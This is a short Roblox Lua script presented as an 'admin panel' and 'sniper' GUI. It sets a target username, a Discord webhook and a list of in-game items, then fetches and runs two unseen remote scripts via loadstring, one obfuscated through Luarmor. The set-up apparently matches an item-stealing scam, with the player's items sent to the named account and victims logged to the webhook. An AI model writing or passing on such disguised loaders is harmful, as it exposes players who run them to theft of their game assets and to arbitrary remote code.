-- Mode: ADMINPANEL
getgenv().TARGET_USERNAME = "tepiq15"
getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1544457442107072533/"
getgenv().NORMAL_BRAINROTS = {
    ["Noobini Pizzanini"] = true,
    ["Lirilì Larilà"] = true,
    ["Fluriflura"] = true
}
getgenv().NORMAL_BASE_SKINS = {}
getgenv().NORMAL_GEARS = {}

-- Cargando GUI SNIPER
task.spawn(function()
   loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()
end)

-- Cargando Sniper.lua desde GitHub
task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/sab-api/GUIAP/refs/heads/main/GUIAP.lua"))()
end)